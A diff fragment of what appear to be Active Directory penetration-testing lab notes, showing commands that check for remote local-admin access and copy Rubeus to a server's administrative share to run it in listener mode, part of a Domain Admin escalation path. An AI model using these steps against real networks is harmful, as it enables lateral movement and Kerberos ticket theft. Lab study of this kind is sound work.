@@ -624,8 +624,6 @@ Import the Find-PSRemotingLocalAdminAccess.ps1 module to see if we can log in th
 Find-PSRemotingLocalAdminAccess
 ```
 ![[Pasted image 20231025162212.png]]
-
-*Compromise the server and escalate to Domain Admin privileges*
 Use rubeus on the server to run on listener mode
 ```powershell
 echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
